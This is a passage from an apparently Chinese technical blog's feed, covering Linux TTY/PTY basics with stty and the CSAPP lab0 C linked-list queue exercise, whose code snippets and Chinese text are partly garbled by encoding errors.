(percpu_counter_sum_positive(&amp;nr_files) &gt;= files_stat.max_files)<br>            <span class="hljs-keyword">goto</span> over;<br>    &#125;<br>    f = __alloc_file(flags, cred);<br>    <span class="hljs-keyword">if</span> (!IS_ERR(f)) percpu_counter_inc(&amp;nr_files);<br><br>    <span class="hljs-keyword">return</span> f;<br><br>over:<br>    <span class="hljs-comment">/* Ran out of filps - report that */</span><br>    <span class="hljs-keyword">if</span> (get_nr_files() &gt; old_max) &#123;<br>        pr_info(<span class="hljs-string">&quot;VFS: file-max limit %lu reached\n&quot;</span>, get_max_files());<br>        old_max = get_nr_files();<br>    &#125;<br>    <span class="hljs-keyword">return</span> ERR_PTR(-ENFILE);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux tty&amp;pty</title>
    <link href="/p/f2031cbb/"/>
    <url>/p/f2031cbb/</url>
    
    <content type="html"><![CDATA[<h1 id="TTYçš„å†å²"><a href="#TTYçš„å†å²" class="headerlink" title="TTYçš„å†å²"></a>TTYçš„å†å²</h1><p>TTYå…¨ç§°<code>TeleTYpewriter</code>ï¼Œä¹Ÿå³æ˜¯ç”µä¼ æ‰“å­—æœºï¼Œå®ƒé€šè¿‡ä¸¤æ ¹ç”µç¼†è¿æ¥è®¡ç®—æœºï¼Œä¸€æ ¹ç”¨äºå‘è®¡ç®—æœºå‘é€æŒ‡ä»¤ï¼Œä¸€æ ¹ç”¨äºæ¥æ”¶è®¡ç®—æœºçš„è¾“å‡ºï¼Œè¾“å‡ºç»“æœæ˜¯æ‰“å°åœ¨çº¸ä¸Šçš„</p><p>ç”±äºå†å²åŸå› ï¼Œ Linuxä¿ç•™äº†TTYï¼Œä¸Šè¿°çš„<strong>è¾“å…¥å’Œè¾“å‡º</strong>ä¸¤ä¸ªç”µç¼†ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºæ˜¯<strong>é”®ç›˜è¾“å…¥å’Œæ˜¾å¡è¾“å‡º</strong></p><p><img src="https://img-blog.csdnimg.cn/1842af912af64a9dbe89704d49e775a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="ttyå’Œsttyå‘½ä»¤"><a href="#ttyå’Œsttyå‘½ä»¤" class="headerlink" title="ttyå’Œsttyå‘½ä»¤"></a>ttyå’Œsttyå‘½ä»¤</h1><p>ttyå‘½ä»¤è¿”å›å½“å‰çš„ç»ˆç«¯åå­—ï¼Œ1è¡¨ç¤ºå¯ä»¥é€šè¿‡Ctrl+Alt+F3å¾—åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$ tty<br>/dev/pts/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>sttyæ˜¯å¯¹ttyè¿›è¡Œè®¾ç½®çš„å‘½ä»¤ï¼Œsè¡¨ç¤ºset</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gams">- <span class="hljs-keyword">Display</span> <span class="hljs-keyword">all</span> settings <span class="hljs-keyword">for</span> the current terminal:<br>  stty -a<br><br>- <span class="hljs-keyword">Set</span> the <span class="hljs-comment">number of rows:</span><br>  stty <span class="hljs-comment">rows rows</span><br><br>- <span class="hljs-keyword">Set</span> <span class="hljs-comment">the number of columns:</span><br>  stty <span class="hljs-comment">cols cols</span><br><br>- Get <span class="hljs-comment">the actual transfer speed of a device:</span><br>  stty <span class="hljs-comment">-F path</span>/to/<span class="hljs-comment">device_file speed</span><br><br>- Reset <span class="hljs-comment">all modes to reasonable values for the current terminal:</span><br>  stty <span class="hljs-comment">sane</span><br><br></code></pre></td></tr></table></figure><p>åˆ—å‡ºå½“å‰ttyçš„æ‰€æœ‰é…ç½®ä¿¡æ¯ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">$ stty -a<br>speed <span class="hljs-number">9600</span> baud; rows <span class="hljs-number">35</span>; columns <span class="hljs-number">129</span>; <span class="hljs-attr">line</span> = <span class="hljs-number">0</span>;<br><span class="hljs-attr">intr</span> = ^C; <span class="hljs-attr">quit</span> = ^\; <span class="hljs-attr">erase</span> = ^?; <span class="hljs-attr">kill</span> = ^U; <span class="hljs-attr">eof</span> = ^D; <span class="hljs-attr">eol</span> = &lt;undef&gt;; <span class="hljs-attr">eol2</span> = &lt;undef&gt;; <span class="hljs-attr">swtch</span> = &lt;undef&gt;; <span class="hljs-attr">start</span> = ^Q; <span class="hljs-attr">stop</span> = ^S;<br><span class="hljs-attr">susp</span> = ^Z; <span class="hljs-attr">rprnt</span> = ^R; <span class="hljs-attr">werase</span> = ^W; <span class="hljs-attr">lnext</span> = ^V; <span class="hljs-attr">discard</span> = ^O; <span class="hljs-attr">min</span> = <span class="hljs-number">1</span>; <span class="hljs-attr">time</span> = <span class="hljs-number">0</span>;<br>-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts<br>-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8<br>opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0<br>isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc<br></code></pre></td></tr></table></figure><h1 id="åˆ‡æ¢tty"><a href="#åˆ‡æ¢tty" class="headerlink" title="åˆ‡æ¢tty"></a>åˆ‡æ¢tty</h1><p>Ctrl+Alt+F1å¯ä»¥åˆ‡æ¢åˆ°ç¬¬ä¸€ä¸ªttyï¼Œä»¥æ­¤ç±»æ¨</p><p>è¿™é‡ŒæŠŠå­—ç¬¦ä¸²è¾“å…¥åˆ°tty2ï¼Œç”±äºç°åœ¨å¤„äºpts1ï¼Œå› æ­¤ç»ˆç«¯æ²¡æœ‰æ˜¾ç¤ºï¼Œå½“åˆ‡æ¢åˆ°tty2å°±ä¼šæ˜¾ç¤ºå­—ç¬¦ä¸²</p><p><img src="https://img-blog.csdnimg.cn/14ddcea701fe49c881e128b27d51b178.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œåˆ‡æ¢åˆ°äº†tty4<br><img src="https://img-blog.csdnimg.cn/fdeb641bc1284013aa86a0fc3040f3eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="ä¼ªç»ˆç«¯ï¼špseudo-terminal"><a href="#ä¼ªç»ˆç«¯ï¼špseudo-terminal" class="headerlink" title="ä¼ªç»ˆç«¯ï¼špseudo terminal"></a>ä¼ªç»ˆç«¯ï¼špseudo terminal</h1><ul><li>ç»ˆç«¯æ¨¡æ‹Ÿå™¨(terminal emulator) ï¼Œæ˜¯è¿è¡Œåœ¨å†…æ ¸çš„æ¨¡å—</li><li>ç”¨æˆ·æ€çš„ç»ˆç«¯æ¨¡æ‹Ÿç¨‹åºï¼Œè¢«ç§°ä¸ºä¼ªç»ˆç«¯ï¼ˆpseudo terminal, PTYï¼‰</li></ul><p>å¯ä»¥é€šè¿‡æ‰“å¼€æ–‡ä»¶ /dev/ptmx åˆ›å»ºä¼ªç»ˆç«¯ï¼Œä¼ªç»ˆç«¯ pty å…·æœ‰ä»¥ä¸‹ä¸¤ç§ç”¨é€”ï¼š</p><ul><li>ä½¿ç”¨ telnetã€ ssh å‘½ä»¤æ”¯æŒè¿œç¨‹ç™»å½•</li><li>æä¾›çª—å£ç³»ç»Ÿç”¨ä»¥åˆ›å»ºå‘½ä»¤è§£é‡Šç¨‹åºçª—å£çš„ç•Œé¢</li></ul><h1 id="ptyæœ€å¤§é…é¢"><a href="#ptyæœ€å¤§é…é¢" class="headerlink" title="ptyæœ€å¤§é…é¢"></a>ptyæœ€å¤§é…é¢</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>pty/max<br>              <span class="hljs-keyword">This</span> <span class="hljs-keyword">file</span> defines the maximum number of pseudoterminals.<br><br>       <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>pty/nr<br>              <span class="hljs-keyword">This</span> <span class="hljs-keyword">read</span>-only <span class="hljs-keyword">file</span> indicates how many pseudoterminals are<br>              currently in use.<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c1e2fda7aa8b4054997f8f4d0f04de88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab0ï¼šC Programming Lab</title>
    <link href="/p/3b50ff2c/"/>
    <url>/p/3b50ff2c/</url>
    
    <content type="html"><![CDATA[<h1 id="é˜Ÿåˆ—çš„é“¾è¡¨å®ç°"><a href="#é˜Ÿåˆ—çš„é“¾è¡¨å®ç°" class="headerlink" title="é˜Ÿåˆ—çš„é“¾è¡¨å®ç°"></a>é˜Ÿåˆ—çš„é“¾è¡¨å®ç°</h1><p>ç”¨ä¸€ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºé“¾è¡¨ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to the first element in the queue, or NULL if the</span><br><span class="hljs-comment">     *        queue is empty.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">list_ele_t</span> *head;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * <span class="hljs-doctag">TODO:</span> You will need to add more fields to this structure</span><br><span class="hljs-comment">     *       to efficiently implement q_size and q_insert_tail</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">list_ele_t</span> *tail;<br>    <span class="hljs-keyword">int</span> size;<br>&#125; <span class="hljs-keyword">queue_t</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Linked list element containing a string.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * You shouldn&#x27;t change this struct.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to a char array containing a string value.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * The memory for this string should be explicitly allocated and freed</span><br><span class="hljs-comment">     * whenever an element is inserted and removed from the queue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">char</span> *value;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to the next element in the linked list.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> *<span class="hljs-title">next</span>;</span><br>&#125; <span class="hljs-keyword">list_ele_t</span>;<br></code></pre></td></tr></table></figure><ul><li>queue_tç»“æ„ä½“ä¸­headã€tailåˆ†åˆ«æ˜¯æŒ‡å‘list_ele_tç±»å‹çš„æŒ‡é’ˆ</li><li>list_eleç»“æ„ä½“ä¸­åŒ…å«ä¸¤ä¸ªæŒ‡é’ˆï¼Œåˆ†åˆ«æŒ‡å‘charå’Œlist_eleç±»å‹</li><li>é˜Ÿåˆ—çš„æ•°æ®ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</li></ul><p><img src="/image/csapp/Snipaste_2022-08-27_12-10-43.png"></p><h1 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h1><p>å®Œæˆä»¥ä¸‹å‡½æ•°å¹¶é€šè¿‡è¯„æµ‹ç³»ç»Ÿï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* Create empty queue. */</span><br>queue_t *queue<span class="hljs-constructor">_new(<span class="hljs-params">void</span>)</span>;<br><br><span class="hljs-comment">/* Free ALL storage used by queue. */</span><br>void queue<span class="hljs-constructor">_free(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span>;<br><br><span class="hljs-comment">/* Attempt to insert element at head of queue. */</span><br><span class="hljs-built_in">bool</span> queue<span class="hljs-constructor">_insert_head(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">s</span>)</span>;<br><br><span class="hljs-comment">/* Attempt to insert element at tail of queue. */</span><br><span class="hljs-built_in">bool</span> queue<span class="hljs-constructor">_insert_tail(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">s</span>)</span>;<br><br><span class="hljs-comment">/* Attempt to remove element from head of queue. */</span><br><span class="hljs-built_in">bool</span> queue<span class="hljs-constructor">_remove_head(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>, <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">sp</span>, <span class="hljs-params">size_t</span> <span class="hljs-params">bufsize</span>)</span>;<br><br><span class="hljs-comment">/* Return number of elements in queue. */</span><br>size_t queue<span class="hljs-constructor">_size(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span>;<br><br><span class="hljs-comment">/* Reverse elements in queue */</span><br>void queue<span class="hljs-constructor">_reverse(<span class="hljs-params">queue_t</span> <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span>;<br></code></pre></td></tr></table></figure><h1 id="queue-new"><a href="#queue-new" class="headerlink" title="queue_new"></a>queue_new</h1><ul><li>ä½¿ç”¨mallocåœ¨å †ä¸Šç»™queue_tåˆ†é…å†…å­˜</li><li>å°†headå’ŒtailæŒ‡é’ˆã€sizeåˆå§‹åŒ–<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Allocates a new queue</span><br><span class="hljs-comment"> * @return The new queue, or NULL if memory allocation failed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">queue_t</span> *<span class="hljs-title">queue_new</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// malloc:success return pointer to addr ; error return NULL</span><br>    <span class="hljs-keyword">queue_t</span> *q = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">queue_t</span>));<br>    <span class="hljs-comment">/* What if malloc returned NULL? */</span><br>    <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>) &#123;<br>        q-&gt;head = <span class="hljs-literal">NULL</span>;<br>        q-&gt;tail = <span class="hljs-literal">NULL</span>;<br>        q-&gt;size = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> q;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="queue-free"><a href="#queue-free" class="headerlink" title="queue_free"></a>queue_free</h1><ul><li>ä½¿ç”¨freeå‡½æ•°é‡Šæ”¾å†…å­˜ï¼Œæ³¨æ„åˆ°q-&gt;head-&gt;valueå’Œq-&gt;headéƒ½åº”è¯¥è¢«freeï¼Œå¦‚æœåªfreeäº†q-&gt;head-&gt;valueä¼šæŠ¥å†…å­˜æ³„éœ²</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xl">void queue_free(queue_t *q) &#123;<br>    <span class="hljs-comment">/* How about freeing the list elements and the strings? */</span><br>    <span class="hljs-comment">/* Free queue structure */</span><br>    <span class="hljs-keyword">if</span> (q != NULL) &#123;<br>        <span class="hljs-function"><span class="hljs-title">while</span> (q-&gt;</span>size) &#123;<br>            <span class="hljs-function"><span class="hljs-title">list_ele_t</span> *temp = q-&gt;</span><span class="hljs-function"><span class="hljs-title">head</span>-&gt;</span>next;<br>            <span class="hljs-function"><span class="hljs-title">free</span>(q-&gt;</span><span class="hljs-function"><span class="hljs-title">head</span>-&gt;</span>value);<br>            <span class="hljs-function"><span class="hljs-title">free</span>(q-&gt;</span>head);<br>            <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span>head = temp;<br>            <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span>size--;<br>        &#125;<br>    &#125;<br>    free(q);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="queue-insert-head"><a href="#queue-insert-head" class="headerlink" title="queue_insert_head"></a>queue_insert_head</h1><ul><li>åœ¨å¤´éƒ¨æ’å…¥èŠ‚ç‚¹</li><li>ä½¿ç”¨mallocä¸ºæ–°èŠ‚ç‚¹å’Œæ–°èŠ‚ç‚¹ä¸­çš„å­—ç¬¦ä¸²åˆ†é…ç©ºé—´ï¼Œæ³¨æ„<code>sizeof(char) * (strlen(s) + 1)</code>è¯­å¥</li><li>é™¤äº†ç»™èŠ‚ç‚¹ã€èŠ‚ç‚¹å†…çš„å­—ç¬¦ä¸²åˆ†é…ç©ºé—´å¤–ï¼Œä¸å¯ä»¥åˆ†é…åˆ«çš„ç©ºé—´<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@brief</span> Attempts to insert an element at head of a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function explicitly allocates space to create a copy of `s`.</span><br><span class="hljs-comment"> * The inserted element points to a copy of `s`, instead of `s` itself.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in] q The queue to insert into</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in] s String to be copied and inserted into the queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> true if insertion was successful</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> false if q is NULL, or memory allocation failed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">bool</span> queue_insert_head(queue_t *q, <span class="hljs-keyword">const</span> char *s) &#123;<br><br>    <span class="hljs-comment">/* What should you do if the q is NULL? */</span><br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    list_ele_t *newh = (list_ele_t *)malloc(sizeof(list_ele_t));<br>    <span class="hljs-keyword">if</span> (newh == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-comment">/* Don&#x27;t forget to allocate space for the string and copy it */</span><br>    newh-&gt;value = (char *)malloc(sizeof(char) * (strlen(s) + <span class="hljs-number">1</span>));<br>    newh-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">/* What if either call to malloc returns NULL? */</span><br>    <span class="hljs-keyword">if</span> (newh-&gt;value == <span class="hljs-literal">NULL</span>) &#123;<br>        free(newh); <span class="hljs-comment">// this is important</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    strcpy(newh-&gt;value, s);<br>    <span class="hljs-comment">// insert</span><br>    <span class="hljs-keyword">if</span> (q-&gt;head == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// what if q-&gt;head ==NULL?</span><br>    &#123;<br>        q-&gt;head = newh;<br>        q-&gt;tail = newh;<br>        q-&gt;size++;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        newh-&gt;next = q-&gt;head;<br>        q-&gt;head = newh;<br>        q-&gt;size++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="queue-remove-head"><a href="#queue-remove-head" class="headerlink" title="queue_remove_head"></a>queue_remove_head</h1><ul><li>å°†é˜Ÿåˆ—å¤´ç»“ç‚¹åˆ å»ï¼ŒåŒæ—¶è¦ä½¿ç”¨strncpyå°†èŠ‚ç‚¹ä¸­çš„å­—ç¬¦ä¸²å¤åˆ¶ä¿å­˜ä¸‹æ¥</li><li>æ³¨æ„strncpyçš„ç”¨æ³•ï¼Œå¯ä»¥å‚è€ƒc++referenceï¼Œå­—ç¬¦ä¸²æœ«å°¾è¦æ‰‹åŠ¨åŠ \0</li><li>è¦åŒæ—¶freeèŠ‚ç‚¹å’ŒèŠ‚ç‚¹å†…æŒ‡å‘charçš„æŒ‡é’ˆ<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@brief</span> Attempts to remove an element from head of a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If removal succeeds, this function frees all memory used by the</span><br><span class="hljs-comment"> * removed list element and its string value before returning.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If removal succeeds and `buf` is non-NULL, this function copies up to</span><br><span class="hljs-comment"> * `bufsize - 1` characters from the removed string into `buf`, and writes</span><br><span class="hljs-comment"> * a null terminator &#x27;\0&#x27; after the copied string.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in]  q       The queue to remove from</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[out] buf     Output buffer to write a string value into</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span>[in]  bufsize Size of the buffer `buf` points to</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> true if removal succeeded</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> false if q is NULL or empty</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">bool</span> queue_remove_head(queue_t *q, char *buf, size_t bufsize) &#123;<br>    <span class="hljs-comment">/* You need to fix up this code. */</span><br>    <span class="hljs-keyword">if</span> (q == <span class="hljs-literal">NULL</span> || q-&gt;size == <span class="hljs-number">0</span> || buf == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    strncpy(buf, q-&gt;head-&gt;value, bufsize - <span class="hljs-number">1</span>); <span class="hljs-comment">// max bufsize-1 bytes copied</span><br>    buf[bufsize - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    list_ele_t *temp = q-&gt;head;<br>    <span class="hljs-keyword">if</span> (q-&gt;size == <span class="hljs-number">1</span>) &#123;<br>        q-&gt;size--;<br>        q-&gt;head = <span class="hljs-literal">NULL</span>;<br>        q-&gt;tail = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">if</span> (temp-&gt;value != <span class="hljs-literal">NULL</span>)<br>            free(temp-&gt;value);<br>        free(temp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        q-&gt;size--;<br>        q-&gt;head = q-&gt;head-&gt;next;<br>        <span class="hljs-keyword">if</span> (temp-&gt;value != <span class="hljs-literal">NULL</span>)<br>            free(temp-&gt;value);<br>        free(temp);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="queue-size"><a href="#queue-size" class="headerlink" title="queue_size"></a>queue_size</h1><ul><li>è¦æ³¨æ„åˆ°è¿”å›å€¼æ˜¯size_tç±»å‹ï¼Œæ‰€ä»¥è¦è¿›è¡Œä¸€æ¬¡å¼ºåˆ¶ç±»å‹è½¬æ¢<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 